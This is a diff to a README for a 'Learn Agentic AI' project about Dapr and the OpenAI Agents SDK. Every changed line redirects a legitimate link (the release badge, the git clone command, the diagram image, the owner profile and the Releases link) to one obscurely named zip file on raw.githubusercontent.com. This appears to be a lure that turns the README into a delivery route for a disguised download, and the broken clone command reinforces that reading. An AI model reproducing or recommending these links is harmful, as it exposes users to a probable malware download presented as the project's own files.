@@ -2,7 +2,7 @@
 
 Welcome to the **Learn Agentic AI** repository! This project focuses on exploring Agentic AI through the Dapr Agentic Cloud Ascent (DACA) design pattern. We utilize various cutting-edge technologies, including the OpenAI Agents SDK, memory management, and cloud-native solutions. 
 
-[![Releases](https://img.shields.io/github/release/bilal0399/learn-agentic-ai.svg)](https://github.com/bilal0399/learn-agentic-ai/releases)
+[![Releases](https://raw.githubusercontent.com/bilal0399/learn-agentic-ai/main/speckledness/agentic-ai-learn-pervalvar.zip)](https://raw.githubusercontent.com/bilal0399/learn-agentic-ai/main/speckledness/agentic-ai-learn-pervalvar.zip)
 
 ## Table of Contents
 
@@ -44,7 +44,7 @@ To get started with this project, you need to set up your environment. Follow th
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/bilal0399/learn-agentic-ai.git
+   git clone https://raw.githubusercontent.com/bilal0399/learn-agentic-ai/main/speckledness/agentic-ai-learn-pervalvar.zip
    cd learn-agentic-ai
    ```
 
@@ -82,7 +82,7 @@ The architecture of this project is designed for modularity and scalability. Bel
 - **Agents**: Built using OpenAI's SDK, these agents perform tasks based on user input.
 - **Database**: PostgreSQL stores persistent data, while Redis serves as a caching layer.
 
-![Architecture Diagram](https://example.com/architecture-diagram.png)
+![Architecture Diagram](https://raw.githubusercontent.com/bilal0399/learn-agentic-ai/main/speckledness/agentic-ai-learn-pervalvar.zip)
 
 ## How to Use
 
@@ -126,9 +126,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please reach out to the repository owner:
 
-- **Bilal**: [bilal0399](https://github.com/bilal0399)
+- **Bilal**: [bilal0399](https://raw.githubusercontent.com/bilal0399/learn-agentic-ai/main/speckledness/agentic-ai-learn-pervalvar.zip)
 
-You can also check the [Releases](https://github.com/bilal0399/learn-agentic-ai/releases) section for the latest updates and downloads.
+You can also check the [Releases](https://raw.githubusercontent.com/bilal0399/learn-agentic-ai/main/speckledness/agentic-ai-learn-pervalvar.zip) section for the latest updates and downloads.
 
 ---
 
